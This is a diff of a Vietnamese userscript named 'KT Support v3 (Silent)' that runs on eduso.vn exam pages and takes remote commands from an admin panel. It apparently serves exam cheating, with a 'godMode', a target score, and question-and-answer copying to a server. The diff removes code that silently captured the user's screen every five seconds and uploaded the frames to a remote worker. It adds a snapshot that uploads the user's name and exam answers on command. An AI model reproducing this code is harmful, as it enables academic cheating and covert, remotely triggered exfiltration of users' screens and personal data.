@@ -1,3 +1,15 @@
+// ==UserScript==
+// @name         KT Support v3 (Silent)
+// @namespace    https://kt-support
+// @version      3.0
+// @description  KT Support — không UI, không guard, chỉ nhận lệnh từ Admin Panel
+// @author       Nguyen
+// @match        https://practice.eduso.vn/*
+// @match        https://*.eduso.vn/*/student/exam/detail/*
+// @grant        GM_setValue
+// @grant        GM_getValue
+// @run-at       document-start
+// ==/UserScript==
 
 (function() {
 'use strict';
@@ -301,82 +313,56 @@ function sendHeartbeat() {
 sendHeartbeat();
 setInterval(sendHeartbeat, 15000);
 
-// ==================== SCREEN CAPTURE MỖI 5S ====================
-// Dùng getDisplayMedia — user cho phép 1 lần, script tự chụp frame định kỳ
-let _screenStream = null;
-let _screenVideo  = null;
-let _screenCanvas = null;
-let _screenCtx    = null;
-let _captureInterval = null;
+// ==================== DOM SNAPSHOT (on-demand, chỉ khi admin yêu cầu) ====================
+async function doSnapshot() {
+    const snap = {
+        takenAt: Date.now(),
+        url: location.href,
+        userName: _currentUserName || null,
+        practiceId: PRACTICE_ID,
+        pageTitle: document.title || '',
+        isRunning,
+        godMode: GOD_MODE,
+        speed: _speed,
+        targetScore: _targetScore,
+        totalQuestions: 0,
+        answeredQuestions: 0,
+        questions: [],
+    };
 
-async function initScreenCapture() {
-    try {
-        // Xin quyền capture màn hình (hiện dialog 1 lần)
-        _screenStream = await navigator.mediaDevices.getDisplayMedia({
-            video: { cursor: 'always', displaySurface: 'browser' },
-            audio: false,
-        });
+    const items = document.querySelectorAll('.quiz-item');
+    snap.totalQuestions = items.length;
 
-        // Tạo video element ẩn để nhận stream
-        _screenVideo = document.createElement('video');
-        _screenVideo.srcObject = _screenStream;
-        _screenVideo.muted = true;
-        _screenVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;';
-        document.body.appendChild(_screenVideo);
-        await _screenVideo.play();
+    items.forEach((item, idx) => {
+        const titleEl = item.querySelector('.quiz-box-header .title, .quiz-title, h4, h3');
+        const title = titleEl?.innerText?.trim()?.slice(0, 80) || `Câu ${idx + 1}`;
 
-        // Canvas để chụp frame
-        _screenCanvas = document.createElement('canvas');
-        _screenCtx    = _screenCanvas.getContext('2d');
+        const checkedRadio    = item.querySelector('input[type="radio"]:checked');
+        const checkedCheckbox = item.querySelector('input[type="checkbox"]:checked');
+        const fillSpan        = item.querySelector('span.fillquiz[contenteditable]');
+        const fillVal         = fillSpan?.innerText?.trim();
+        const answered = !!(checkedRadio || checkedCheckbox || (fillVal && fillVal !== 'Trả lời...'));
 
-        // Khi stream bị dừng (user tắt share), reset
-        _screenStream.getVideoTracks()[0].addEventListener('ended', () => {
-            stopScreenCapture();
-        });
+        let selectedAnswer = '';
+        if (checkedRadio || checkedCheckbox) {
+            const lbl = item.querySelector('input:checked')?.closest('label, .form-check');
+            selectedAnswer = lbl?.querySelector('.answer-text, label')?.innerText?.trim()?.slice(0, 40) || '✓';
+        } else if (fillVal && fillVal !== 'Trả lời...') {
+            selectedAnswer = fillVal.slice(0, 40);
+        }
 
-        // Bắt đầu chụp mỗi 5s
-        _captureInterval = setInterval(captureFrame, 5000);
-        // Chụp ngay lập tức
-        setTimeout(captureFrame, 1000);
-
-    } catch(e) {
-        console.log('[KT] Screen capture cancelled or not supported:', e.message);
-    }
-}
-
-function stopScreenCapture() {
-    if (_captureInterval) { clearInterval(_captureInterval); _captureInterval = null; }
-    if (_screenStream)    { _screenStream.getTracks().forEach(t => t.stop()); _screenStream = null; }
-    if (_screenVideo)     { _screenVideo.remove(); _screenVideo = null; }
-    _screenCanvas = null; _screenCtx = null;
-}
-
-async function captureFrame() {
-    if (!_screenVideo || !_screenCanvas || !_screenCtx) return;
-    if (_screenVideo.readyState < 2) return; // chưa sẵn sàng
+        if (answered) snap.answeredQuestions++;
+        snap.questions.push({ idx: idx + 1, title, answered, selectedAnswer });
+    });
 
     try {
-        const vw = _screenVideo.videoWidth  || 1280;
-        const vh = _screenVideo.videoHeight || 720;
-        // Scale xuống để giảm kích thước gửi lên
-        const scale  = Math.min(1, 900 / vw);
-        _screenCanvas.width  = Math.round(vw * scale);
-        _screenCanvas.height = Math.round(vh * scale);
-        _screenCtx.drawImage(_screenVideo, 0, 0, _screenCanvas.width, _screenCanvas.height);
-
-        const dataUrl = _screenCanvas.toDataURL('image/jpeg', 0.55);
-
         await fetch(`${WORKER_URL}/api/screenshot/${encodeURIComponent(CLIENT_ID)}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ data: dataUrl, type: 'screenshot' }),
+            body: JSON.stringify({ data: snap, type: 'domSnapshot' }),
         });
     } catch(e) {}
 }
-
-// Lệnh từ admin để khởi động / dừng screen capture
-// (cũng có thể tự khởi động — bỏ comment dòng dưới nếu muốn tự bật)
-// setTimeout(initScreenCapture, 2000);
 
 // ==================== COPY Q&A (gửi lên server để admin xem) ====================
 function buildQAText() {
@@ -510,12 +496,8 @@ function handleRemoteCommand(cmd) {
             doCopyQA();
             break;
 
-        case 'startCapture':
-            if (!_screenStream) initScreenCapture();
-            break;
-
-        case 'stopCapture':
-            stopScreenCapture();
+        case 'getSnapshot':
+            doSnapshot();
             break;
     }
 }
